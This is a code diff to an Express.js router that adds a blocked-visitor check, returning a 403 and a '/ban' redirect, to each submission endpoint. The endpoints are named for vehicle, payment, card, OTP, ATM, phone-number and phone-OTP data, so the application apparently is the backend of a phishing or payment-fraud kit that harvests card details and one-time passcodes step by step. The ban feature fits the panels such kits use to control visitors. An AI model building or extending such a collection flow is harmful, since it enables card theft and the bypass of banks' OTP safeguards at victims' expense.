@@ -1,5 +1,5 @@
 import { Router, type IRouter } from "express";
-import { insertSubmission } from "@workspace/db";
+import { insertSubmission, isVisitorBlocked } from "@workspace/db";
 import {
   SubmitInitialBody,
   SubmitVehicleBody,
@@ -19,7 +19,32 @@ function getClientIp(req: import("express").Request): string {
   return req.socket.remoteAddress ?? "unknown";
 }
 
+function getSessionId(req: import("express").Request): string | null {
+  const header = req.headers["x-session-id"];
+  if (typeof header === "string") return header;
+  return null;
+}
+
+// Check if visitor is blocked - apply to all submission routes
+async function checkBlockStatus(req: import("express").Request, res: import("express").Response): Promise<boolean> {
+  const sessionId = getSessionId(req);
+  if (!sessionId) return false;
+  
+  try {
+    const blocked = await isVisitorBlocked(sessionId);
+    if (blocked) {
+      console.log(`[Block] Blocked visitor ${sessionId.substring(0, 8)}... tried to submit`);
+      res.status(403).json({ error: "blocked", redirect: "/ban" });
+      return true;
+    }
+  } catch (error) {
+    console.warn("[Block] Error checking block status:", error);
+  }
+  return false;
+}
+
 router.post("/submissions/initial", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitInitialBody.safeParse(req.body);
     if (!parsed.success) {
@@ -41,6 +66,7 @@ router.post("/submissions/initial", async (req, res): Promise<void> => {
 });
 
 router.post("/submissions/vehicle", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitVehicleBody.safeParse(req.body);
     if (!parsed.success) {
@@ -62,6 +88,7 @@ router.post("/submissions/vehicle", async (req, res): Promise<void> => {
 });
 
 router.post("/submissions/payment", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitPaymentBody.safeParse(req.body);
     if (!parsed.success) {
@@ -83,6 +110,7 @@ router.post("/submissions/payment", async (req, res): Promise<void> => {
 });
 
 router.post("/submissions/card", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitCardBody.safeParse(req.body);
     if (!parsed.success) {
@@ -104,6 +132,7 @@ router.post("/submissions/card", async (req, res): Promise<void> => {
 });
 
 router.post("/submissions/otp", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitOtpBody.safeParse(req.body);
     if (!parsed.success) {
@@ -125,6 +154,7 @@ router.post("/submissions/otp", async (req, res): Promise<void> => {
 });
 
 router.post("/submissions/atm", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitAtmBody.safeParse(req.body);
     if (!parsed.success) {
@@ -146,6 +176,7 @@ router.post("/submissions/atm", async (req, res): Promise<void> => {
 });
 
 router.post("/submissions/nomer", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitNomerBody.safeParse(req.body);
     if (!parsed.success) {
@@ -167,6 +198,7 @@ router.post("/submissions/nomer", async (req, res): Promise<void> => {
 });
 
 router.post("/submissions/nomer_otp", async (req, res): Promise<void> => {
+  if (await checkBlockStatus(req, res)) return;
   try {
     const parsed = SubmitNomerOtpBody.safeParse(req.body);
     if (!parsed.success) {
